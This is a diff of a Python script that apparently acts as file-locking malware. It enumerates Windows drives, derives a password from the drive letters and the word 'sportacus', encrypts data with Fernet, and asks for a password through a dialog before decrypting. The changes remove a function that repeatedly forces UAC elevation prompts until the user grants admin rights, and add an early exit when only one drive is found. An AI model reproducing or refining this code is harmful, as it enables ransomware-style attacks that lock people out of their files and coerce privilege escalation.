@@ -1,11 +1,11 @@
-from os import walk, chdir, environ
+from os import walk, chdir
 from os.path import join
 from ctypes import windll
 from string import ascii_uppercase
 from tkinter import Tk
 from tkinter.simpledialog import askstring
-from sys import executable
 from cryptography.fernet import Fernet
+from sys import exit
 
 
 def crypt_basic():
@@ -24,7 +24,6 @@ def get_drives(mode):
         bitmask >>= 1
     drives.remove("C:")
     drives.append("sportacus")
-    drives.remove("F:")
     for i in drives:
         pw += i
     if mode == 0:
@@ -99,21 +98,13 @@ def dialog(pw):
     return True
 
 
-def force_admin():
-    x = 0
-    if windll.shell32.IsUserAnAdmin():
-        return True
-    else:
-        while x != 42:
-            x = windll.shell32.ShellExecuteW(None, "runas", executable, "", None, 1)
-        return True
-
-
-pwd = get_drives(0)
+drives, pw = get_drives(2)
+if len(drives) <= 1:
+    exit()
 method = crypt_basic()
 
 while not encrypt(method):
     pass
-if dialog(pwd):
+if dialog(pw):
     while not decrypt(method):
         pass
